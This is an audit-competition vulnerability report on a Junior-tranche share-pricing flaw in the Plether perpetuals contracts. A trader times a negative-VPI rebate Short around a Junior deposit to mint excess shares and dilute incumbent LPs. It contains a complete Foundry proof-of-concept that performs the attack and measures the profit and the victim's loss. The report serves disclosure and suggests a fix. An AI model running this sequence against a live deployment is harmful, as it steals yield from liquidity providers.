# \#99166 [SC-Critical] Funded negative-VPI rebate reserve omitted from Junior entry NAV enables yield theft

**Submitted on Nov 12th 2026 at 09:07:48 UTC by @Psyone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99166
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

A trader who also deposits into the Junior tranche can open a skew-reducing Short before the deposit activates and close it afterward. Opening pays a negative-VPI rebate from HousePool cash and locks an equal, nonwithdrawable clawback reserve in MarginClearinghouse. The funded reserve is omitted from Junior entry NAV, so the temporary cash reduction mints excess shares. Closing returns the cash to HousePool, but the shares retain their claim on it. A public-Router Foundry PoC at release settings yields +736.150920 USDG attacker token net before gas/financing and a 40.104080 USDG lower paid claim for a measured incumbent Junior LP share slice versus a matched same-trade control.

## Vulnerability Details

Target: packages/perps/src at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8. OpenAccountingLib.sol:127-135 combines signed VPI and execution fee. A skew-reducing open leads CfdEnginePlanLib.sol:328-350 to select a pool-funded rebate and gross negative-VPI reserve target. CfdEngineSettlementSidecar.sol:442-478 pays the rebate from HousePool into the trader's clearinghouse account and locks the reserve. CfdEngineProtocolLens.sol:59-77 gives HousePool physical pool cash, trader claims and marked price PnL, but omits the funded VPI clawback. HousePoolAccountingLib.sol:60-83 consequently prices ownership after cash has left the pool without the recoverable backing. At a matured epoch, HousePool.sol:1038-1095 and TrancheVault.sol:1398-1409 mint Junior shares against that depressed principal. A full close later consumes the reserve back into HousePool (CfdEngineSettlementSidecar.sol:690-720; MarginClearinghouse.sol:883-906), without repricing the already minted shares.

The PoC uses launch parameters: 1% VPI factor, 40% maximum skew, 4-bps execution fee, 25-bps settlement buffer, and 40M USDG / 80% Senior limits. The fixture has 10M Senior and 10M Junior backing; an unrelated funded trader holds an 8M Long. The attacker uses a separate 5M-funded Junior LP account and 1M-funded trader account. They request a Junior deposit, commit and execute a 4M Short through public V3 Router methods, then settle the deposit epoch at a fresh six-feed neutral mark while the Short's 11,990.407075 USDG reserve remains locked outside HousePool. They claim the excess shares, close the Short through the Router, and redeem after normal cooldown and epoch settlement. The test also redeems the same number of incumbent Junior shares in both branches. The attacker controls their own Short timing and LP request; no malicious owner, oracle manipulation, or privileged keeper is needed. MockPyth is used locally as the competition permits. The 20M pool is an executable source state, not a claim about current deployment liquidity.

## Impact Details

The paired control performs the same 4M Short, pays the same trading fees, and closes it before the Junior mint. Deposit/redemption epoch times, victim share count, final mark, and initial reserve match. With the reserve held across mint, attacker shares are 5,006,263,253,134,481 atoms versus 5,000,257,615,064,937 in the control; attacker funded redemption is 5,003,939.852725 versus 4,999,939.031129 USDG. After returning the 5M LP deposit and withdrawing remaining trader collateral, attacker token net is +736.150920 versus -3,268.356894 USDG. An incumbent Junior LP's actual funded claim for identical 100,163,736,183,150 share atoms is 100,116.334354 versus 100,156.438434 USDG: a 40.104080 USDG shortfall on the measured slice. The no-Short control gives -60.968900 USDG attacker net. These attacker and victim figures describe one ownership transfer and must not be added. The incumbent had positive previously reconciled VPI upside, supporting High theft of unclaimed yield. Critical principal theft and repeated extraction are not proved. Token net excludes gas and financing costs for about 6M USDG nominal attacker capital.

## Prior public material

Merged PR #62 (https://github.com/Plether-Fi/plether-core/pull/62) fixed a distinct Junior pricing defect: marked trader-profit liabilities affected withdrawal NAV but not deposit NAV, so entrants got too few shares. That fix is present at the pinned commit. This PoC passes on post-merge code and shows too many shares from a cash-paid VPI rebate and funded clawback. Pinned SECURITY.md (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L849-L872) states that the reserve is excluded from symmetric NAV and consumed on close. We do not claim the exclusion was hidden. The documented material does not describe this cross-epoch paid-loss sequence. We recognize that program eligibility depends on its public-root interpretation.

## Mitigation

Separate ownership pricing from withdrawable cash: account for a funded, collectible negative-VPI clawback when minting Junior shares, or defer entry activation while that amount makes ownership pricing inconsistent. Preserve physical-cash redemption constraints and account-local reserve isolation.

## Proof of Concept

## Proof of Concept

Copy the Solidity source below to `packages/perps/test/HuntVpiNavPublic76.t.sol` in the competition checkout at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. From the repository root run:

```sh
forge test --root packages/perps --match-path test/HuntVpiNavPublic76.t.sol -vv --jobs 1
```

Expected: `test_ReleaseConfigAttackVsControl` and `test_MatchedTradeCloseTiming` pass. I independently reran this exact source (SHA-256 `737d67fb221b48b728d6c1bd42b3d6718cea7ea34971c4c90672cc40a655e6f5`) with Foundry v1.5.1 / solc 0.8.35 in a clean pinned checkout: 2 passed, 0 failed. The log records the 11,990.407075 USDG funded reserve, +736.150920 USDG attacker token net, and 40.104080 USDG lower incumbent paid claim in the matched timing test.

The fixture uses `LegacyOrderRouterHarness` only to deploy the standard test system. It calls the inherited production V3 `commitOrder(OrderRequest)`, public `executeOrder`, and public `settleLpEpoch`; that subclass does not override them. There is no Router impersonation, direct Engine trade call, scoped-contract storage edit, or in-scope contract mock. MockPyth supplies the six release feeds as the competition permits.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {console2} from "forge-std/console2.sol";

contract HuntVpiNavPublic76 is BasePerpTest {
    address constant VICTIM_LP = address(0x1001);
    address constant SENIOR_LP = address(0x1002);
    address constant VICTIM_TRADER = address(0x1003);
    address constant ATTACKER_LP = address(0x1004);
    address constant ATTACKER_TRADER = address(0x1005);

    uint256 constant LONG_SIZE = 8_000_000e18;
    uint256 constant SHORT_SIZE = 4_000_000e18;
    uint256 constant DEPOSIT = 5_000_000e6;
    uint256 constant TRADER_CAPITAL = 1_000_000e6;
    bytes32[] internal sixFeedIds;

    struct Outcome {
        uint256 shares;
        uint256 redeemed;
        uint256 traderEnding;
        uint256 reserveAfterOpen;
        uint256 poolAfterOpen;
        uint256 poolBeforeClose;
        uint256 poolAfterClose;
        uint256 victimPrincipalAfter;
        uint256 victimRedeemed;
        uint256 victimShares;
        uint256 depositTime;
        uint256 attackerRedeemTime;
        uint256 victimRedeemTime;
        uint256 terminalMark;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 9_000_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return VICTIM_LP;
    }

    function _seniorSeedReceiver() internal pure override returns (address) {
        return SENIOR_LP;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.settlementBufferBps(), 25);
        _warpToLiveMarket();
        _rotateToSixFeedOracle();
        _warpToLiveMarket();
        _setLiveSix(1e8, vm.getBlockTimestamp());
        router.updateMarkPrice(_emptyUpdate());
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 100);

        settlementToken.mint(VICTIM_LP, 1_000_000e6);
        vm.startPrank(VICTIM_LP);
        settlementToken.approve(address(juniorVault), 1_000_000e6);
        uint256 victimDepositId = juniorVault.requestDeposit(1_000_000e6, VICTIM_LP, VICTIM_LP);
        vm.stopPrank();
        _warpToEpoch(victimDepositId);
        _publicSettleLpEpoch();
        vm.prank(VICTIM_LP);
        juniorVault.claimDeposit(victimDepositId, 1_000_000e6, VICTIM_LP, VICTIM_LP);

        _fundTrader(VICTIM_TRADER, 1_000_000e6);
        _fundTrader(ATTACKER_TRADER, TRADER_CAPITAL);
        _route(VICTIM_TRADER, CfdTypes.Side.LONG, LONG_SIZE, 500_000e6, false);

        // A normal matured LP request causes the pre-existing long's cash revenue to be reconciled.
        settlementToken.mint(VICTIM_LP, 1e6);
        vm.startPrank(VICTIM_LP);
        settlementToken.approve(address(juniorVault), 1e6);
        uint256 priorId = juniorVault.requestDeposit(1e6, VICTIM_LP, VICTIM_LP);
        vm.stopPrank();
        _warpToEpoch(priorId);
        _publicSettleLpEpoch();
        vm.prank(VICTIM_LP);
        juniorVault.claimDeposit(priorId, 1e6, VICTIM_LP, VICTIM_LP);
    }

    function test_ReleaseConfigAttackVsControl() public {
        uint256 snap = vm.snapshotState();
        Outcome memory attack = _run(1);
        assertTrue(vm.revertToState(snap));
        Outcome memory control = _run(0);

        int256 attackPnl = int256(attack.redeemed + attack.traderEnding) - int256(DEPOSIT + TRADER_CAPITAL);
        int256 controlPnl = int256(control.redeemed + control.traderEnding) - int256(DEPOSIT + TRADER_CAPITAL);
        console2.log("attack redeemed atoms", attack.redeemed);
        console2.log("control redeemed atoms", control.redeemed);
        console2.log("attack shares", attack.shares);
        console2.log("control shares", control.shares);
        console2.log("reserve after open", attack.reserveAfterOpen);
        console2.log("pool after open", attack.poolAfterOpen);
        console2.log("pool before close", attack.poolBeforeClose);
        console2.log("pool after close", attack.poolAfterClose);
        console2.log("victim attack redeemed", attack.victimRedeemed);
        console2.log("victim control redeemed", control.victimRedeemed);
        console2.log("matched victim shares", attack.victimShares);
        console2.logInt(attackPnl);
        console2.logInt(controlPnl);
        assertGt(attack.reserveAfterOpen, 0, "short must lock a funded reserve");
        assertGt(attack.poolAfterClose, attack.poolBeforeClose, "close must restore pool cash");
        assertGt(attack.shares, control.shares, "temporary NAV dip must mint excess shares");
        assertGt(attack.redeemed, control.redeemed, "excess shares must pay extra real cash");
        assertGt(attackPnl, controlPnl, "attacker must beat matched control net of trading cost");
        assertGt(attackPnl, 0, "attack must profit after trader costs");
        assertLt(attack.victimPrincipalAfter, control.victimPrincipalAfter, "existing LP must lose junior value");
        assertEq(attack.victimShares, control.victimShares, "victim claim must use equal shares");
        assertEq(attack.depositTime, control.depositTime, "deposit epochs must settle at equal time");
        assertEq(attack.attackerRedeemTime, control.attackerRedeemTime, "attacker exits at equal time");
        assertEq(attack.victimRedeemTime, control.victimRedeemTime, "victim exits at equal time");
        assertEq(attack.terminalMark, control.terminalMark, "branches must use equal six-feed marks");
        assertLt(attack.victimRedeemed, control.victimRedeemed, "existing LP must receive less on actual claim");
    }

    function test_MatchedTradeCloseTiming() public {
        uint256 snap = vm.snapshotState();
        Outcome memory attack = _run(1);
        assertTrue(vm.revertToState(snap));
        Outcome memory earlyClose = _run(2);

        int256 attackPnl = int256(attack.redeemed + attack.traderEnding) - int256(DEPOSIT + TRADER_CAPITAL);
        int256 earlyClosePnl = int256(earlyClose.redeemed + earlyClose.traderEnding) - int256(DEPOSIT + TRADER_CAPITAL);
        console2.log("timing attack redeemed", attack.redeemed);
        console2.log("timing early redeemed", earlyClose.redeemed);
        console2.log("timing attack victim paid", attack.victimRedeemed);
        console2.log("timing early victim paid", earlyClose.victimRedeemed);
        console2.logInt(attackPnl);
        console2.logInt(earlyClosePnl);

        assertEq(attack.reserveAfterOpen, earlyClose.reserveAfterOpen, "same short must lock equal reserve");
        assertEq(attack.poolAfterOpen, earlyClose.poolAfterOpen, "same open pool payout");
        assertEq(attack.victimShares, earlyClose.victimShares, "identical victim share claim");
        assertEq(attack.depositTime, earlyClose.depositTime, "same mint epoch");
        assertEq(attack.attackerRedeemTime, earlyClose.attackerRedeemTime, "same attacker exit epoch");
        assertEq(attack.victimRedeemTime, earlyClose.victimRedeemTime, "same victim exit epoch");
        assertEq(attack.terminalMark, earlyClose.terminalMark, "same six-feed mark");
        assertGt(attack.shares, earlyClose.shares, "reserve present at mint must create excess shares");
        assertGt(attack.redeemed, earlyClose.redeemed, "excess shares must pay additional cash");
        assertGt(attackPnl, earlyClosePnl, "late close must profit versus matched-trade control");
        assertLt(attack.victimRedeemed, earlyClose.victimRedeemed, "victim's funded claim must be diluted");
    }

    // mode 0 = no short, mode 1 = reserve held across mint, mode 2 = same short closed before mint.
    function _run(uint8 mode) internal returns (Outcome memory result) {
        settlementToken.mint(ATTACKER_LP, DEPOSIT);
        vm.startPrank(ATTACKER_LP);
        settlementToken.approve(address(juniorVault), DEPOSIT);
        uint256 depositId = juniorVault.requestDeposit(DEPOSIT, ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();

        if (mode != 0) {
            _route(ATTACKER_TRADER, CfdTypes.Side.SHORT, SHORT_SIZE, 500_000e6, false);
            result.reserveAfterOpen = clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER);
            result.poolAfterOpen = settlementToken.balanceOf(address(pool));
            if (mode == 2) {
                result.poolBeforeClose = result.poolAfterOpen;
                _route(ATTACKER_TRADER, CfdTypes.Side.SHORT, SHORT_SIZE, 0, true);
                assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER), 0);
                result.poolAfterClose = settlementToken.balanceOf(address(pool));
            } else {
                _neutralTick();
            }
        } else {
            _neutralTick();
            _neutralTick();
        }

        _warpToEpoch(depositId);
        _publicSettleLpEpoch();
        result.depositTime = vm.getBlockTimestamp();
        assertEq(juniorVault.claimableDepositRequest(depositId, ATTACKER_LP), DEPOSIT);
        vm.prank(ATTACKER_LP);
        result.shares = juniorVault.claimDeposit(depositId, DEPOSIT, ATTACKER_LP, ATTACKER_LP);

        if (mode == 1) {
            result.poolBeforeClose = settlementToken.balanceOf(address(pool));
            _route(ATTACKER_TRADER, CfdTypes.Side.SHORT, SHORT_SIZE, 0, true);
            assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER), 0);
            result.poolAfterClose = settlementToken.balanceOf(address(pool));
        } else {
            _neutralTick();
        }

        uint256 unlock = juniorVault.lastDepositTime(ATTACKER_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlock) vm.warp(unlock);
        vm.prank(ATTACKER_LP);
        uint256 redeemId = juniorVault.requestRedeem(result.shares, ATTACKER_LP, ATTACKER_LP);
        _warpToEpoch(redeemId);
        _publicSettleLpEpoch();
        result.attackerRedeemTime = vm.getBlockTimestamp();
        assertEq(juniorVault.claimableRedeemRequest(redeemId, ATTACKER_LP), result.shares);
        vm.prank(ATTACKER_LP);
        result.redeemed = juniorVault.claimRedeem(redeemId, result.shares, ATTACKER_LP, ATTACKER_LP);
        assertEq(result.redeemed, settlementToken.balanceOf(ATTACKER_LP));
        result.victimPrincipalAfter = pool.juniorPrincipal();

        uint256 victimShares = juniorVault.maxRequestRedeem(VICTIM_LP) / 10;
        result.victimShares = victimShares;
        vm.prank(VICTIM_LP);
        uint256 victimRedeemId = juniorVault.requestRedeem(victimShares, VICTIM_LP, VICTIM_LP);
        _warpToEpoch(victimRedeemId);
        _publicSettleLpEpoch();
        result.victimRedeemTime = vm.getBlockTimestamp();
        result.terminalMark = engine.lastMarkPrice();
        assertEq(juniorVault.claimableRedeemRequest(victimRedeemId, VICTIM_LP), victimShares);
        vm.prank(VICTIM_LP);
        result.victimRedeemed = juniorVault.claimRedeem(victimRedeemId, victimShares, VICTIM_LP, VICTIM_LP);

        uint256 traderAssets = clearinghouse.balanceAssets(ATTACKER_TRADER);
        vm.prank(ATTACKER_TRADER);
        clearinghouse.withdraw(ATTACKER_TRADER, traderAssets);
        result.traderEnding = settlementToken.balanceOf(ATTACKER_TRADER);
    }

    function _warpToEpoch(uint256 id) internal {
        uint256 at = pool.lpEpochStart(id);
        if (vm.getBlockTimestamp() < at) vm.warp(at);
    }

    function _publicSettleLpEpoch() internal {
        uint256 tick = vm.getBlockTimestamp();
        _setUniqueSix(1e8, tick, tick - 1);
        _setLiveSix(1e8, tick);
        router.settleLpEpoch(_emptyUpdate());
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 100);
    }

    function _rotateToSixFeedOracle() internal {
        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
        bases[0] = 117_500_000;
        bases[1] = 638_000;
        bases[2] = 134_480_000;
        bases[3] = 72_880_000;
        bases[4] = 10_860_000;
        bases[5] = 126_100_000;
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
        for (uint256 i; i < 6; ++i) sixFeedIds.push(ids[i]);

        PletherOracle sixFeedOracle =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig({pletherOracle: address(sixFeedOracle)}));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        pletherOracle = sixFeedOracle;
    }

    function _emptyUpdate() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _rawSix(uint256 index, uint256 basketPrice) internal pure returns (int64 raw) {
        uint256[6] memory bases = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
        uint256 normalized = bases[index] * basketPrice / 1e8;
        uint256 value = index == 1 || index >= 3 ? (1e16 + normalized / 2) / normalized : normalized;
        require(value > 0 && value <= uint256(uint64(type(int64).max)), "positive signed Pyth price");
        raw = int64(uint64(value));
    }

    function _setLiveSix(uint256 basketPrice, uint256 publishTime) internal {
        for (uint256 i; i < 6; ++i) {
            baseMockPyth.setPrice(sixFeedIds[i], _rawSix(i, basketPrice), 0, -8, publishTime);
        }
    }

    function _setUniqueSix(uint256 basketPrice, uint256 publishTime, uint256 previousTime) internal {
        for (uint256 i; i < 6; ++i) {
            baseMockPyth.setUniquePrice(sixFeedIds[i], _rawSix(i, basketPrice), 0, -8, publishTime, previousTime);
        }
    }

    function _route(address trader, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        uint256 target = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(nowTs + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        uint256 tick = uint256(pending.commitTime) + 1;
        vm.warp(tick);
        vm.roll(vm.getBlockNumber() + 1);
        _setUniqueSix(1e8, tick, tick - 2);
        _setLiveSix(1e8, tick);
        OrderV3Types.ExecutionResult memory outcome = router.executeOrder(orderId, _emptyUpdate());
        assertEq(uint8(outcome.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Router execution must fill");
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 100);
    }

    function _neutralTick() internal {
        uint256 tick = vm.getBlockTimestamp() + 1;
        vm.warp(tick);
        vm.roll(vm.getBlockNumber() + 1);
        _setUniqueSix(1e8, tick, tick - 2);
        _setLiveSix(1e8, tick);
        router.updateMarkPrice(_emptyUpdate());
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 100);
    }

    function _warpToLiveMarket() internal {
        for (uint256 i; i < 168 && (engine.isOracleFrozen() || engine.isFadWindow()); ++i) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        }
        assertFalse(engine.isOracleFrozen(), "market must be live");
        assertFalse(engine.isFadWindow(), "market must not be in FAD");
    }
}
```
